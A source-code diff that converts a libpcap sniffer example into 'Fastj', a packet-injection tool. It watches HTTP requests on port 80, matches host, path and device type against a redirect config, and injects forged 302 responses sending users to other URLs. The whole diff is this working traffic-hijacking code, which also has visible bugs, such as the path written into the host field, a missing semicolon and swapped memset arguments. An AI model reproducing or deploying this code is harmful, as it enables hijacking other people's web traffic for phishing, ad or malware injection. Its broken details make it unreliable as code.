@@ -1,7 +1,7 @@
-#define APP_NAME        "sniffex"
-#define APP_DESC        "Sniffer example using libpcap"
-#define APP_COPYRIGHT    "Copyright (c) 2005 The Tcpdump Group"
-#define APP_DISCLAIMER    "THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."
+#define APP_NAME        "Fastj"
+#define APP_DESC        "Http inject using libpcap"
+#define APP_COPYRIGHT    "Copyright (c) 2018"
+#define APP_DISCLAIMER    "Write By XiaodongPan."
 
 #include <pcap.h>
 #include <stdio.h>
@@ -19,8 +19,9 @@
 
 #include "picohttpparser.h"
 #include "hash.h"
+#include "slog.h"
 
-#define BILLION 1000000000L 
+#define BILLION 1000000000L
 
 /*the number of a batch report */
 #define REPORT_BATCH_NUM 1000
@@ -33,6 +34,9 @@
 
 /* max url length, longer than 480 will be skiped */
 #define MAX_URL_LEN 480
+
+/* max host length */
+#define MAX_HOST_LEN 32
 
 /* url buffer length, should > MAX_URL_LEN+30 */
 #define URL_BUF_LEN 512
@@ -52,37 +56,23 @@
 /* Ethernet addresses are 6 bytes */
 #define ETHER_ADDR_LEN    6
 
-#ifdef DEBUG
-#define DEBUG_PRINT(fmt, args...)    fprintf(stderr, fmt, ## args)
-#else
-#define DEBUG_PRINT(fmt, args...)    /* Don't do anything in release builds */
-#endif
-
-#ifdef DEBUG1
-#define DEBUG1_PRINT(fmt, args...)    fprintf(stderr, fmt, ## args)
-#else
-#define DEBUG1_PRINT(fmt, args...)    /* Don't do anything in release builds */
-#endif
-
 
 
 u_char g_packet[PACKET_BUILD_LEN];
 hashtable_t *g_dict;
-char g_config[] = "url.ini";
-char g_http_payload[128];
+char g_config[] = "conf/online.ini";
 
 //u_char g_local_mac[] = {0x00, 0x16, 0x3e, 0x30, 0x7d, 0x82};
 //u_char g_gateway_mac[] = {0xee, 0xff, 0xff, 0xff, 0xff, 0xff};
-u_char g_local_mac[] = {0xF8, 0xBC, 0x12, 0x38, 0xA7, 0xBC};
-u_char g_gateway_mac[] = {0x4c, 0xb1, 0x6c, 0x8b, 0x8f, 0x39};
+uint8_t g_local_mac[] = {0xF8, 0xBC, 0x12, 0x38, 0xA7, 0xBC};
+uint8_t g_gateway_mac[] = {0x4c, 0xb1, 0x6c, 0x8b, 0x8f, 0x39};
 
-typedef struct pseudo_hdr {
-    uint32_t src;
-    uint32_t dst;
-    unsigned char mbz;
-    unsigned char proto;
-    uint16_t len;
-} pseudo_hdr;
+typedef struct http_header {
+    char host[MAX_HOST_LEN];
+    char path[MAX_URL_LEN];
+    int platform;
+} http_header_t;
+
 
 /* Ethernet header */
 struct sniff_ethernet {
@@ -136,6 +126,12 @@ struct sniff_tcp {
     u_short th_urp;                 /* urgent pointer */
 };
 
+char *get_relocation_url(hashtable_t *dict, http_header_t *header);
+
+int find_platform(const char *agent, size_t len);
+
+int get_http_header(const char *header, size_t header_len, http_header_t *http_header);
+
 void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 
 void print_payload(const u_char *payload, int len);
@@ -152,30 +148,48 @@ int build_packet(u_char *packet, char *relocation_url);
 
 void read_config(hashtable_t *hash, char *config);
 
-int get_url_from(const char *header, size_t header_len, char *url, int *url_len);
-
-void debug_printf(const char *format, ...);
-
-void debug_printf(const char *format, ...)
-{
-    va_list arglist;
-
-    time_t rawtime;
-    struct tm * timeinfo;
-
-      time ( &rawtime );
-      timeinfo = localtime ( &rawtime );
-
-      printf ( "%.24s: ", asctime (timeinfo) );
-
-    va_start( arglist, format );
-    vprintf( format, arglist );
-    va_end( arglist );
-}
-
 uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len);
 
 uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *srcaddr, uint32_t *destaddr);
+
+int str2mac(const char *macaddr, unsigned char mac[6]);
+
+void debug_printf(const char *format, ...);
+
+void debug_printf(const char *format, ...) {
+    va_list arglist;
+
+    time_t rawtime;
+    struct tm *timeinfo;
+
+    time(&rawtime);
+    timeinfo = localtime(&rawtime);
+
+    printf("%.24s: ", asctime(timeinfo));
+
+    va_start(arglist, format);
+    vprintf(format, arglist);
+    va_end(arglist);
+}
+
+
+int str2mac(const char *macaddr, unsigned char mac[6]) {
+    unsigned int m[6];
+    if (sscanf(macaddr, "%02x:%02x:%02x:%02x:%02x:%02x",
+               &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) {
+        printf("Failed to parse mac address '%s'", macaddr);
+        return -1;
+    } else {
+        mac[0] = m[0];
+        mac[1] = m[1];
+        mac[2] = m[2];
+        mac[3] = m[3];
+        mac[4] = m[4];
+        mac[5] = m[5];
+        return 0;
+    }
+}
+
 
 uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len) {
     unsigned int cksum;
@@ -225,17 +239,31 @@ uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *
 
 
 void read_config(hashtable_t *hash, char *config) {
-    char *key, *value;
-    char *search = "=";
+    char *domain, *path, *redirect;
+    int chance, platform, match;
+    char *search = "|";
+    char line[INPUT_BUF_LEN];
 
     FILE *file = fopen(config, "r");
     if (file != NULL) {
-        char line[INPUT_BUF_LEN]; 
         while (fgets(line, sizeof line, file) != NULL) {
-            key = strtok(line, search);
-            value = strtok(NULL, search);
-            DEBUG_PRINT("%s --> %s", key, value);
-            ht_set(hash, key, value);
+            chance = atoi(strtok(line, search));
+            match = atoi(strtok(NULL, search));
+            platform = atoi(strtok(NULL, search));
+            domain = strtok(NULL, search);
+            path = strtok(NULL, search);
+            redirect = strtok(NULL, search);
+            //printf("%s %s --> %s", domain, path, redirect);
+            elem_t *elem = (elem_t *) malloc(sizeof(elem_t));
+            elem->chance = chance;
+            elem->match = match;
+            elem->platform = platform;
+            strcpy(elem->domain, domain);
+            strcpy(elem->path, path);
+            strcpy(elem->redirect, redirect);
+            elem->next = NULL;
+
+            ht_set(hash, domain, elem);
         }
         fclose(file);
     } else {
@@ -243,36 +271,90 @@ void read_config(hashtable_t *hash, char *config) {
     }
 }
 
+
+/* platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc */
+int find_platform(const char *agent, size_t len) {
+    if (strnstr(agent, "iPhone", len) != NULL) {
+        return 1;
+    }
+
+    if (strnstr(agent, "Android", len) != NULL) {
+        return 2;
+    }
+
+    return 4;
+}
+
+char *get_relocation_url(hashtable_t *dict, http_header_t *header) {
+    elem_t *elem = NULL;
+    elem = ht_get(dict, header->host);
+
+    // domain not match, return
+    if (elem == NULL) {
+        return NULL;
+    }
+
+    while (elem != NULL) {
+        // reg match
+        // platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc
+        if (elem->match == 0) {
+            if ((strstr(header->path, elem->path) != NULL) &&
+                (elem->platform == 0 ||
+                 elem->platform == header->platform ||
+                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
+                return elem->redirect;
+            }
+        } else {
+            if ((strcmp(header->path, elem->path) == 0) &&
+                (elem->platform == 0 ||
+                 elem->platform == header->platform ||
+                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
+                return elem->redirect;
+            }
+        }
+        elem = elem->next;
+    }
+
+    return NULL;
+}
+
+
 /*
- * get url from header, the max url length limit to 480, 480+7+16<512
+ * get http header, the max url length limit to 480, 480+7+16<512
  * */
-int get_url_from(const char *header, size_t header_len, char *url, int *url_len) {
+int get_http_header(const char *header, size_t header_len, http_header_t *http_header) {
     const char *method, *path;
     struct phr_header headers[16];
     size_t method_len, path_len, num_headers;
     int ret = 0, i, minor_version;
+    int flag = -3;
 
-    num_headers = 16; //sizeof(headers) / sizeof(headers[0]);
-    //printf("size header: %d, num_headers:%d\n",  sizeof(headers), num_headers);
+    num_headers = 16;
     ret = phr_parse_request(header, header_len, &method, &method_len, &path, &path_len,
                             &minor_version, headers, &num_headers, 0);
-    if(path_len> MAX_URL_LEN) {
-        printf("path is very long, size: %d\n", path_len);
-        return 0;
+    if (path_len > MAX_URL_LEN) {
+        printf("path is very long, size: %ld\n", path_len);
+        return flag;
     }
+
+    // copy path to header
+    sprintf(http_header->host, "%.*s", path_len, path);
+    flag++;
+
+
     if (ret == header_len) {
         for (i = 0; i != num_headers; ++i) {
-            if (headers[i].name_len == 4) {
-                if (memcmp("Host", headers[i].name, 4) == 0) {
-                    sprintf(url, "http://%.*s%.*s", (int) headers[i].value_len, headers[i].value, (int) path_len, path);
-                    *url_len = 7 + (int) headers[i].value_len + (int) path_len;
-                    DEBUG_PRINT("%s\n", url);
-                    return *url_len;
-                }
+            if (headers[i].name_len == 4 && memcmp("Host", headers[i].name, 4) == 0) {
+                sprintf(http_header->host, "%.*s", (int) headers[i].value_len, headers[i].value);
+                flag++;
+            } else if (headers[i].name_len == 10 && memcmp("User-Agent", headers[i].name, 10) == 0) {
+                http_header->platform = find_platform(headers[i].value, headers[i].value_len);
+                flag++;
             }
+
         }
     }
-    return 0;
+    return flag;
 }
 
 /*
@@ -284,22 +366,13 @@ void print_app_banner(void) {
     printf("%s\n", APP_COPYRIGHT);
     printf("%s\n", APP_DISCLAIMER);
     printf("\n");
-
-    return;
 }
 
 /*
  * print help text
  */
 void print_app_usage(void) {
-
-    printf("Usage: %s [interface]\n", APP_NAME);
-    printf("\n");
-    printf("Options:\n");
-    printf("    interface    Listen on <interface> for packets.\n");
-    printf("\n");
-
-    return;
+    printf("Usage: fastj capdev senddev sendmac gatemac\n");
 }
 
 /*
@@ -392,25 +465,8 @@ void print_payload(const u_char *payload, int len) {
             break;
         }
     }
-
-    return;
 }
 
-const char *sstrstr(const char *haystack, const char *needle, size_t length) {
-    size_t needle_length = strlen(needle);
-    size_t i;
-
-    for (i = 0; i < length; i++) {
-        if (i + needle_length > length) {
-            return NULL;
-        }
-
-        if (strncmp(&haystack[i], needle, needle_length) == 0) {
-            return &haystack[i];
-        }
-    }
-    return NULL;
-}
 
 void swap_bytes(void *a, void *b, size_t width) {
     char *v1 = (char *) a;
@@ -430,15 +486,15 @@ int build_packet(u_char *packet, char *relocation_url) {
     struct sniff_ip *ip;              /* The IP header */
     struct sniff_tcp *tcp;            /* The TCP header */
     char *payload, *option;
-    char  payload302[PAYLOAD_BUF_LEN];
+    char payload302[PAYLOAD_BUF_LEN];
     int packet_len;
     int size_ip, size_tcp, size_option, size_payload, new_size_payload;
     u_int16_t sport, dport, sum;
     u_int32_t seq, ack;
- 
+
     // memset
     //memset(payload302, 0, PAYLOAD_BUF_LEN);
-	
+
     // set mac
     ethernet = (struct sniff_ethernet *) (packet);
     //swap_bytes(ethernet->ether_dhost, ethernet->ether_shost, ETHER_ADDR_LEN);
@@ -460,7 +516,7 @@ int build_packet(u_char *packet, char *relocation_url) {
         memset(option, 0, size_option);
     }
 
-    DEBUG1_PRINT("option len: %d\n", size_option);
+    slog_debug(3, "option len: %d\n", size_option);
 
     sport = tcp->th_sport;
     dport = tcp->th_dport;
@@ -488,9 +544,9 @@ int build_packet(u_char *packet, char *relocation_url) {
     ip->ip_len = htons(size_ip + size_tcp + new_size_payload);
     packet_len = SIZE_ETHERNET + size_ip + size_tcp + new_size_payload;
 
-    DEBUG1_PRINT("payload302:%s\n", payload302);
-    DEBUG1_PRINT("size_payload:%d, size_eth: %d, size_ip: %d, size_tcp: %d, packet_len: %d\n",
-                new_size_payload, SIZE_ETHERNET, size_ip, size_tcp, packet_len);
+    slog_debug(3, "payload302:%s\n", payload302);
+    slog_debug(3, "size_payload:%d, size_eth: %d, size_ip: %d, size_tcp: %d, packet_len: %d\n",
+                 new_size_payload, SIZE_ETHERNET, size_ip, size_tcp, packet_len);
 
     ip->ip_sum = 0;
     sum = ip_chksum(0, (uint8_t *) ip, size_ip);
@@ -513,33 +569,31 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     const struct sniff_tcp *tcp;            /* The TCP header */
     const char *payload;                    /* Packet payload */
     char *relocation_url;
-    char req_url[URL_BUF_LEN];
-
+    http_header_t req_http_header;
     int size_ip;
     int size_tcp;
     int size_payload;
     int size_packet;
     int size_send;
-    int size_req_url;
-    
+
     /* qps handle */
     static int count = 0;
     static struct timespec old;
     static struct timespec new;
     uint64_t diff_nsec = 0;
-  	time_t ltime; 
+    time_t ltime;
 
-    if(count%REPORT_BATCH_NUM == 0){
-		clock_gettime(CLOCK_MONOTONIC, &new);
-		if(count != 0){
-			diff_nsec = (BILLION * (new.tv_sec - old.tv_sec));
-    		diff_nsec += new.tv_nsec - old.tv_nsec;
-			float diff_sec = diff_nsec*1e-9;
-			float rate = REPORT_BATCH_NUM/diff_sec;
-    		ltime=time(NULL);
-			printf("%.24s  count:%d, rate:%.3f\n", asctime(localtime(&ltime)), count, rate);
-		}
-		old = new;
+    if (count % REPORT_BATCH_NUM == 0) {
+        clock_gettime(CLOCK_MONOTONIC, &new);
+        if (count != 0) {
+            diff_nsec = (BILLION * (new.tv_sec - old.tv_sec));
+            diff_nsec += new.tv_nsec - old.tv_nsec;
+            float diff_sec = diff_nsec * 1e-9;
+            float rate = REPORT_BATCH_NUM / diff_sec;
+            ltime = time(NULL);
+            printf("%.24s  count:%d, rate:%.3f\n", asctime(localtime(&ltime)), count, rate);
+        }
+        old = new;
     }
     count++;
 
@@ -557,8 +611,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     }
 
     /* print source and destination IP addresses */
-    DEBUG_PRINT("       From: %s\n", inet_ntoa(ip->ip_src));
-    DEBUG_PRINT("         To: %s\n", inet_ntoa(ip->ip_dst));
+    slog_debug(4, "       From: %s\n", inet_ntoa(ip->ip_src));
+    slog_debug(4, "         To: %s\n", inet_ntoa(ip->ip_dst));
 
 
     /* define/compute tcp header offset */
@@ -571,8 +625,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     }
 
 
-    DEBUG_PRINT("   Src port: %d\n", ntohs(tcp->th_sport));
-    DEBUG_PRINT("   Dst port: %d\n", ntohs(tcp->th_dport));
+    slog_debug(4, "   Src port: %d\n", ntohs(tcp->th_sport));
+    slog_debug(4, "   Dst port: %d\n", ntohs(tcp->th_dport));
 
     /* define/compute tcp payload (segment) offset */
     payload = (char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);
@@ -582,31 +636,39 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 
     size_packet = SIZE_ETHERNET + size_ip + size_tcp + size_payload;
     if (size_payload > 0) {
-        DEBUG_PRINT("   Payload (%d bytes):\n", size_payload);
-        int url_len = get_url_from(payload, size_payload, req_url, &size_req_url);
-        //printf("%s\n", req_url);
-        if(url_len==0) {
-             DEBUG_PRINT(" url length is 0\n");
-             return;
-        }
+        slog_debug(4, "   Payload (%d bytes):\n", size_payload);
 
-        relocation_url = ht_get(g_dict, req_url);
-        //DEBUG_PRINT("relocation_url:%s\n", relocation_url);
+
+        // get http header
+        int req = get_http_header(payload, size_payload, &req_http_header);
+        if (req < 0) {
+            slog_warn(2, " http header parse error\n");
+            return;
+        }
+        slog_info(2, "Host: %s, Path: %s, Platform: %s\n", req_http_header.host,
+                  req_http_header.path, req_http_header.platform)
+
+
+        // get relocation url
+        // 1, hash domain, 2, reg search path,  3, match platform
+        relocation_url = get_relocation_url(g_dict, &req_http_header);
+        //slog_debug(4, "relocation_url:%s\n", relocation_url);
+
         if (relocation_url == NULL) {
             return;
         }
-        printf("relocation_url:%s\n", relocation_url);
+        slog_info(2, "relocation_url:%s\n", relocation_url);
 
         memset(g_packet, PACKET_BUILD_LEN, 0);
         memcpy(g_packet, packet, size_packet);
         size_send = build_packet(g_packet, relocation_url);
         if (size_send > 0) {
-             int send_ret = pcap_sendpacket(handle, g_packet, size_send);
-             if(send_ret == 0){
-                 DEBUG1_PRINT("send packat succ\n");
-             }else{
-                 DEBUG1_PRINT("send packat fail\n");
-             }
+            int send_ret = pcap_sendpacket(handle, g_packet, size_send);
+            if (send_ret == 0) {
+                slog_debug(3, "send packat succ\n");
+            } else {
+                slog_debug(3, "send packat fail\n");
+            }
         }
 
     }
@@ -614,119 +676,115 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     return;
 }
 
-void usr1_list_hashtable(int dummy)
-{
+void usr1_list_hashtable(int dummy) {
     ht_list(g_dict);
 }
 
-void usr2_reload_config(int dummy)
-{
+void usr2_reload_config(int dummy) {
     read_config(g_dict, g_config);
 }
 
 int main(int argc, char **argv) {
-	struct sigaction sa = {.sa_flags = 0,};
+    struct sigaction sa = {.sa_flags = 0,};
 
-	sigemptyset(&sa.sa_mask);       /* clear signal set */
-	sigaddset(&sa.sa_mask, SIGUSR1);
-	sigaddset(&sa.sa_mask, SIGUSR2);
+    sigemptyset(&sa.sa_mask);       /* clear signal set */
+    sigaddset(&sa.sa_mask, SIGUSR1);
+    sigaddset(&sa.sa_mask, SIGUSR2);
 
-	sa.sa_handler = usr1_list_hashtable;
-	sigaction(SIGUSR1, &sa, NULL);
-	sa.sa_handler = usr2_reload_config;
-	sigaction(SIGUSR2, &sa, NULL);
+    sa.sa_handler = usr1_list_hashtable;
+    sigaction(SIGUSR1, &sa, NULL);
+    sa.sa_handler = usr2_reload_config;
+    sigaction(SIGUSR2, &sa, NULL);
 
 
-    char *dev = NULL;            /* capture device name */
-    char *send_dev = "em1";
+    char *cap_dev = NULL;            /* capture device name */
+    char *send_dev = NULL;
+    char *send_mac = NULL;
+    char *gate_mac = NULL;
     char errbuf[PCAP_ERRBUF_SIZE];        /* error buffer */
     pcap_t *handle, *send_handle;                /* packet capture handle */
 
-    char filter_exp[] = "tcp dst  port 80  and tcp[tcpflags] & tcp-push == tcp-push";        /* filter expression [3] */
+    char filter_exp[] = "tcp dst  port 80  and tcp[tcpflags] & tcp-push == tcp-push";
     struct bpf_program fp;            /* compiled filter program (expression) */
     bpf_u_int32 net = 0;            /* ip */
     int num_packets = -1;            /* number of packets to capture */
 
     print_app_banner();
 
+    // init log
+    slog_init("fastj", NULL, 2, 3, 1);
+
     /* check for capture device name on command-line */
-    if (argc == 2) {
-        dev = argv[1];
-    } else if (argc > 2) {
-        fprintf(stderr, "error: unrecognized command-line options\n\n");
+    if (argc == 5) {
+        // Usage: fastj capdev senddev sendmac gatemac
+        cap_dev = argv[1];
+        send_dev = argv[2];
+        send_mac = argv[3];
+        gate_mac = argv[4];
+    } else {
         print_app_usage();
         exit(EXIT_FAILURE);
-    } else {
-        /* find a capture device if not specified on command-line */
-        dev = pcap_lookupdev(errbuf);
-        if (dev == NULL) {
-            fprintf(stderr, "Couldn't find default device: %s\n",
-                    errbuf);
-            exit(EXIT_FAILURE);
-        }
     }
 
-    /* get network number and mask associated with capture device */
-    /*if (pcap_lookupnet(dev, &net, &mask,a errbuf) == -1) {
-        fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
-                dev, errbuf);
-        net = 0;
-        mask = 0;
-    }*/
 
     /* print capture info */
-    printf("Device: %s\n", dev);
-    printf("Number of packets: %d\n", num_packets);
-    printf("Filter expression: %s\n", filter_exp);
+    slog_info(2, "cap_dev: %s, send_dev: %s, send_mac:%s , gate_mac:%s\n",
+              cap_dev, send_dev, send_mac, gate_mac);
+    slog_info(2, "Number of packets: %d\n", num_packets);
+    slog_info(2, "Filter expression: %s\n", filter_exp);
+
+    if (str2mac(send_mac, g_local_mac) < 0) {
+        slog_error(1, "Paser send mac error, mac: %s\n", send_mac);
+        exit(EXIT_FAILURE);
+    }
+
+    if (str2mac(gate_mac, g_gateway_mac) < 0) {
+        slog_error(1, "Paser gateway mac error, mac: %s\n", gate_mac);
+        exit(EXIT_FAILURE);
+    }
+
 
     g_dict = ht_create(65536);
     read_config(g_dict, g_config);
 
     /* open capture device */
-    handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
+    handle = pcap_open_live(cap_dev, SNAP_LEN, 1, 1000, errbuf);
     if (handle == NULL) {
-        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+        slog_error(1, "Couldn't open device %s: %s\n", cap_dev, errbuf);
         exit(EXIT_FAILURE);
     }
 
     /* open send device */
     send_handle = pcap_open_live(send_dev, SNAP_LEN, 1, 1000, errbuf);
-    if (handle == NULL) {
-        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+    if (send_handle == NULL) {
+        slog_error(1, "Couldn't open device %s: %s\n", cap_dev, errbuf);
         exit(EXIT_FAILURE);
     }
 
-
-
-    /* make sure we're capturing on an Ethernet device [2] */
-    /*if (pcap_datalink(handle) != DLT_EN10MB) {
-        fprintf(stderr, "%s is not an Ethernet\n", dev);
-        exit(EXIT_FAILURE);
-    }*/
-
     /* compile the filter expression */
     if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
-        fprintf(stderr, "Couldn't parse filter %s: %s\n",
+        slog_error(1, "Couldn't parse filter %s: %s\n",
                 filter_exp, pcap_geterr(handle));
         exit(EXIT_FAILURE);
     }
 
     /* apply the compiled filter */
     if (pcap_setfilter(handle, &fp) == -1) {
-        fprintf(stderr, "Couldn't install filter %s: %s\n",
+        slog_error(1, "Couldn't install filter %s: %s\n",
                 filter_exp, pcap_geterr(handle));
         exit(EXIT_FAILURE);
     }
 
-    printf("start sniff...\n");
+    slog_info(2, "start inject...");
     /* now we can set our callback function */
     pcap_loop(handle, num_packets, got_packet, (u_char *) send_handle);
 
     /* cleanup */
     pcap_freecode(&fp);
     pcap_close(handle);
+    pcap_close(send_handle);
 
-    printf("\nCapture complete.\n");
+    slog_info(2, "Capture complete.");
 
     return 0;
 }
